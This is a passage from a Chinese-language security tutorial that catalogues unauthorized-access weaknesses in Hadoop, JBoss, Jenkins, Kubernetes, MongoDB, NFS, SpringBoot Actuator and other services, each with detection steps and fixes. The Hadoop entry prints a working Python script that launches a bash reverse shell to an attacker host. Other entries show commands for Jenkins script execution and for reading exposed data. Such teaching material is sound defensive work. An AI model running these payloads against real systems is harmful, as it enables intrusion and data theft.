<p><a href="http://192.168.126.130:8088/cluster" target="_blank" rel="noopener noreferrer">http://192.168.126.130:8088/cluster</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg">
        
    </a></p>
<p>利用该漏洞，可以进一步getshell</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003GyDbw3vDEdH.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003GyDbw3vDEdH.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003GyDbw3vDEdH.jpg">
        
    </a>脚本源码如下：rce.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.126.130:8088/&#39;</span> <span class="c1"># 设置目标主机的ip地址</span>
</span></span><span class="line"><span class="cl"><span class="n">lhost</span> <span class="o">=</span> <span class="s1">&#39;192.168.126.128&#39;</span> <span class="c1"># 设置你攻击主机的监听ip地址，并且监听端口为9999</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;ws/v1/cluster/apps/new-application&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app_id</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;application-id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;ws/v1/cluster/apps&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application-id&#39;</span><span class="p">:</span> <span class="n">app_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application-name&#39;</span><span class="p">:</span> <span class="s1">&#39;get-shell&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;am-container-spec&#39;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;commands&#39;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;command&#39;</span><span class="p">:</span> <span class="s1">&#39;/bin/bash -i &gt;&amp; /dev/tcp/</span><span class="si">%s</span><span class="s1">/9999 0&gt;&amp;1&#39;</span> <span class="o">%</span> <span class="n">lhost</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application-type&#39;</span><span class="p">:</span> <span class="s1">&#39;YARN&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000031ATC709TlV4.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000031ATC709TlV4.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000031ATC709TlV4.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>升级Hadoop到x版本以上，并启用Kerberos认证功能，禁止匿名访问;</li>
<li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口；</li>
<li>如无必要，关闭 Hadoop Web 管理页面；</li>
</ul>
<h2 id="14-jboss-未授权访问8080" class="headerLink">
    <a href="#14-jboss-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae8080" class="header-mark"></a>14. JBoss 未授权访问（8080）</h2><p><strong>漏洞简介</strong></p>
<p>漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 http://ip:8080/jmx-console，就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>直接访问 http://ip:port/，看是否能进入 jmx-console 和 web-console 页面</p>
</li>
</ol>
<p>http://ip:8080/</p>
<p>http://ip:8080/jmx-console/</p>
<p>http://ip:8080/jbossws/</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000010oyLV3ixLym.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000010oyLV3ixLym.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000010oyLV3ixLym.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>添加 JMX 控制页面身份认证；</li>
<li>进行JMX Console 安全配置；</li>
<li>关闭jmx-console和web-console;</li>
</ul>
<h2 id="15-jenkins-未授权访问8080" class="headerLink">
    <a href="#15-jenkins-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae8080" class="header-mark"></a>15. Jenkins 未授权访问（8080）</h2><p><strong>漏洞简介</strong></p>
<p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>直接通过url输入以下地址，若能访问，证明存在未授权访问漏洞。</p>
</li>
</ol>
<p><code>http://&lt;target&gt;:8080/manage</code></p>
<p><code>http://&lt;target&gt;:8080/script</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000014FISy1z4TRY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000014FISy1z4TRY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000014FISy1z4TRY.jpg">
        
    </a>未授权访问 http://<target>:8080/script，可以执行系统命令</p>
<p>命令格式</p>
<p><code>println 'whoami'.execute().text</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002mtk6K2YsVOt.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002mtk6K2YsVOt.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002mtk6K2YsVOt.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>对后台控制页面做登录验证限制；</li>
<li>升级Jenkins至新版本；</li>
<li>禁止把Jenkins直接暴露在公网；</li>
</ul>
<h2 id="16-kubernetes-api-server-未授权808010250" class="headerLink">
    <a href="#16-kubernetes-api-server-%e6%9c%aa%e6%8e%88%e6%9d%83808010250" class="header-mark"></a>16. Kubernetes Api Server 未授权（8080、10250）</h2><p><strong>漏洞简介</strong></p>
<p>Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>端口扫描</li>
</ol>
<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
<ol start="2">
<li>检测</li>
</ol>
<p>（1）端口：8080 <a href="http://10.10.4.89:8080/" target="_blank" rel="noopener noreferrer">http://10.10.4.89:8080/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg">
        
    </a></p>
<p>（2）端口：8080：api dashboard：http://10.10.4.89:8080/ui</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000006kGKX3XhHUB.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000006kGKX3XhHUB.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000006kGKX3XhHUB.jpg">
        
    </a></p>
<p>（3）端口：10250端口是kubelet API的HTTPS端口，通过路径:https://xxx/10250/pods获取环境变量、运行的容器信息、命名空间等信息。</p>
<p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000021ntz112Mpqa.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000021ntz112Mpqa.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000021ntz112Mpqa.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>进行授权认证；</li>
<li>使用Service Account令牌；</li>
<li>设置防火墙策略，限定IP访问服务；</li>
</ul>
<h2 id="17-active-mq-未授权访问8161" class="headerLink">
    <a href="#17-active-mq-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae8161" class="header-mark"></a>17. Active MQ 未授权访问（8161）</h2><p><strong>漏洞简介</strong></p>
<p>ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
<p><strong>漏洞检测</strong></p>
<p>默认端口：8161</p>
<p>默认密码：admin/admin</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000164fuY0XqknN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000164fuY0XqknN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000164fuY0XqknN.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<p>针对未授权访问，可修改conf/jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true，重启服务即可。</p>
<p>针对弱口令，可修改conf/jetty.xml文件，bean id 为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务即可。</p>
<h2 id="18-jupyter-notebook-未授权访问8888" class="headerLink">
    <a href="#18-jupyter-notebook-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae8888" class="header-mark"></a>18. Jupyter Notebook 未授权访问（8888）</h2><p><strong>漏洞简介</strong></p>
<p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>使用vulhub搭建漏洞演示环境</li>
</ol>
<p>cd /vulhub/jupyter/notebook-rce</p>
<p>docker-compose up -d</p>
<ol start="2">
<li>
<p>端口扫描</p>
</li>
<li>
<p>访问http://your-ip:8888，将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
</li>
</ol>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000uNGkD4FEXZI.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000uNGkD4FEXZI.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000uNGkD4FEXZI.jpg">
        
    </a><br>
选择 new -&gt; terminal 即可创建一个控制台：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000yNE7j1TUqFD.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000yNE7j1TUqFD.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000yNE7j1TUqFD.jpg">
        
    </a></p>
<p>直接执行任意命令：</p>
<p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002r6S8S1REYZO.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002r6S8S1REYZO.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002r6S8S1REYZO.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>开启身份验证，防止未经授权用户访问；</li>
<li>访问控制策略，限制IP访问，绑定固定IP；</li>
</ul>
<h2 id="19-elasticsearch-未授权访问92009300" class="headerLink">
    <a href="#19-elasticsearch-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae92009300" class="header-mark"></a>19. Elasticsearch 未授权访问（9200、9300）</h2><p><strong>漏洞简介</strong></p>
<p>Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>浏览器访问测试命令</p>
</li>
</ol>
<p>http://localhost:9200</p>
<p>http://localhost:9200/_cat/</p>
<p>http://localhost:9200/_cat/indices</p>
<p>http://localhost:9200/_river/_search //查看数据库敏感信息</p>
<p>http://localhost:9200/_nodes         //查看节点数据</p>
<p>如有安装head插件：</p>
<p>http://localhost:9200/_plugin/head/  //web管理界面</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003Y7Ndb0qeeCy.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003Y7Ndb0qeeCy.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003Y7Ndb0qeeCy.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001jjEMk251zEt.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001jjEMk251zEt.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001jjEMk251zEt.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00004fovr00P5GgW.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00004fovr00P5GgW.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00004fovr00P5GgW.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>访问控制策略，限制IP访问，绑定固定IP；</li>
<li>在config/elasticsearch.yml中为9200端口设置认证等；</li>
</ul>
<h2 id="20-zabbix-未授权访问10051" class="headerLink">
    <a href="#20-zabbix-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae10051" class="header-mark"></a>20. Zabbix 未授权访问（10051）</h2><p><strong>漏洞简介</strong></p>
<p>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>无需账户密码直接访问zabbix页面</p>
</li>
</ol>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002gmbB21HdGFQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002gmbB21HdGFQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002gmbB21HdGFQ.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>设置zabbix的复杂口令，不要用默认口令或弱口令，禁用guest登录功能；</li>
<li>zabbix的server和agent都不要以root启动，不要设置AllowRoot=1；</li>
<li>禁止agent执行run，不要设置EnableRemoteCommands=1；</li>
</ul>
<h2 id="21-memcached-未授权访问11211" class="headerLink">
    <a href="#21-memcached-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae11211" class="header-mark"></a>21. Memcached 未授权访问（11211）</h2><p><strong>漏洞简介</strong></p>
<p>Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>无需用户名密码，可以直接连接memcache 服务的11211端口</p>
</li>
</ol>
<p><code>telnet 10.10.4.89 11211</code></p>
<p># 或者</p>
<p>nc -vv 11211</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001KVFbw0m4qdP.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001KVFbw0m4qdP.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001KVFbw0m4qdP.jpg">
        
    </a></p>
<p>使用了 stats 命令来输出 Memcached 服务信息</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001OlPto2vnwGp.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001OlPto2vnwGp.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001OlPto2vnwGp.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002b1Cly1CcD90.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002b1Cly1CcD90.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002b1Cly1CcD90.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>修改绑定的IP、端口和指定访问者IP；</li>
<li>设置防火墙策略；</li>
<li>禁止暴露在公网；</li>
<li>配置memcached监听本地回环地址</li>
<li>127.0.0.1；</li>
</ul>
<h2 id="22-rabbitmq-未授权访问156721569225672" class="headerLink">
    <a href="#22-rabbitmq-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae156721569225672" class="header-mark"></a>22. RabbitMQ 未授权访问（15672、15692、25672）</h2><p><strong>漏洞简介</strong></p>
<p>RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>浏览器访问测试</p>
</li>
</ol>
<p>默认账号密码都是guest</p>
<p><a href="http://10.10.4.89:15672/" target="_blank" rel="noopener noreferrer">http://10.10.4.89:15672</a></p>
<p>http://10.10.4.89:15692</p>
<p>http://10.10.4.89:25672</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>修改为强密码，删除默认的账号guest；</li>
<li>禁止对外网开放，仅限于内部访问；</li>
</ul>
<h2 id="23-mongodb-未授权访问27017" class="headerLink">
    <a href="#23-mongodb-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae27017" class="header-mark"></a>23. MongoDB 未授权访问（27017）</h2><p><strong>漏洞简介</strong></p>
<p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>
<p>造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>kali安装mongodb，然后直接连接到服务。</p>
</li>
</ol>
<p><code>yum install mongodb</code></p>
<p><code>mongo --host 10.2.20.34 --port 27017</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002s8sJx0ovZ0q.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002s8sJx0ovZ0q.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002s8sJx0ovZ0q.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>限制绑定IP，启动时加入参数&ndash;bind_ip 127.0.0.1或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1；</li>
<li>在system.users中添加用户，启动认证；</li>
<li>设置防火墙策略，限定 IP 访问服务；</li>
<li>禁用HTTP和REST端口，修改配置文件或在启动的时候选择参数nohttpinterface=false；</li>
</ul>
<h2 id="24-nfs-未授权访问204920048" class="headerLink">
    <a href="#24-nfs-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae204920048" class="header-mark"></a>24. NFS 未授权访问（2049、20048）</h2><p><strong>漏洞简介</strong></p>
<p>Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>nfs</p>
</li>
</ol>
<p>linux安装nfs客户端</p>
<p><code>apt install nfs-common</code></p>
<p>查看nfs服务器上的共享目录</p>
<p><code>showmount -e 192.168.126.130</code></p>
<p>挂载相应共享目录到本地</p>
<p><code>mount -t nfs 192.168.126.130:/grdata /mnt</code></p>
<p>#卸载目录</p>
<p><code>umount /mnt</code></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>利用iptables限制端口2049和20048端口的访问，禁止外部访问；</li>
<li>设置/etc/exports，对访问进行控制；</li>
</ul>
<h2 id="25-dubbo-未授权访问28096" class="headerLink">
    <a href="#25-dubbo-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae28096" class="header-mark"></a>25. Dubbo 未授权访问（28096）</h2><p><strong>漏洞简介</strong></p>
<p>Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>连接进入dubbo 服务，进行操作</p>
</li>
</ol>
<p><code>telent IP port</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001UJgvW4bC2jO.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001UJgvW4bC2jO.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001UJgvW4bC2jO.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003DpLVW2jNvMR.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003DpLVW2jNvMR.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003DpLVW2jNvMR.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>配置dubbo认证；</li>
<li>设置防火墙策略，限定IP访问；</li>
</ul>
<h2 id="26-druid-未授权访问" class="headerLink">
    <a href="#26-druid-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>26. Druid 未授权访问</h2><p><strong>漏洞简介</strong></p>
<p>Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。</p>
<p><strong>漏洞检测</strong></p>
<p>直接在网站的url中后加上：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/druid/index.htm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/druid/websession.htm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/druid/datasource.htm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/druid/sql.htm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/druid/spring.html
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p>
<p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>配置访问账号密码；</li>
<li>禁止对外网开放访问；</li>
</ul>
<h2 id="27-solr-未授权访问" class="headerLink">
    <a href="#27-solr-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>27. Solr 未授权访问</h2><p><strong>漏洞简介</strong></p>
<p>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell。</p>
<p><strong>漏洞检测</strong></p>
<p>敏感目录扫描时加上一条 /solr/admin</p>
<p><a href="http://xx.xx.com/solr/admin" target="_blank" rel="noopener noreferrer">http://xx.xx.com/solr/admin</a></p>
<p><a href="https://xx.xx.com/solr/admin" target="_blank" rel="noopener noreferrer">https://xx.xx.com/solr/admin</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00004cVhPP0yEXgk.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00004cVhPP0yEXgk.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00004cVhPP0yEXgk.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>配置solr访问控制权限；</li>
<li>禁止将solr暴露在公网；</li>
</ul>
<h2 id="28-springboot-actuator-未授权访问" class="headerLink">
    <a href="#28-springboot-actuator-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>28. SpringBoot Actuator 未授权访问</h2><p><strong>漏洞简介</strong></p>
<p>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>直接访问相关路径：</li>
</ol>
<p>http://10.2.20.48/actuator/autoconfig</p>
<p><a href="http://10.2.20.48/env" target="_blank" rel="noopener noreferrer">http://10.2.20.48 /actuator/env</a></p>
<p>http://10.2.20.48/actuator/dump</p>
<p><a href="http://10.2.20.48/actuator/headdump" target="_blank" rel="noopener noreferrer">http://10.2.20.48/actuator/headdump</a>可下载</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg">
        
    </a></p>
<ol start="2">
<li>actuator未直接部署在IP根目录下</li>
</ol>
<p>使用burpsuite的插件：APIKit</p>
<p>介绍：<a href="https://www.bilibili.com/read/cv15912732" target="_blank" rel="noopener noreferrer">https://www.bilibili.com/read/cv15912732</a></p>
<p>介绍：https://blog.csdn.net/qq_50854790/article/details/122894291</p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>禁用/env接口；</li>
<li>升级到SpringBoot Actuator 2.0；</li>
<li>禁止对外开放；</li>
</ul>
<h2 id="29-swaggerui未授权访问漏洞" class="headerLink">
    <a href="#29-swaggerui%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>29. SwaggerUI未授权访问漏洞</h2><p><strong>背景</strong></p>
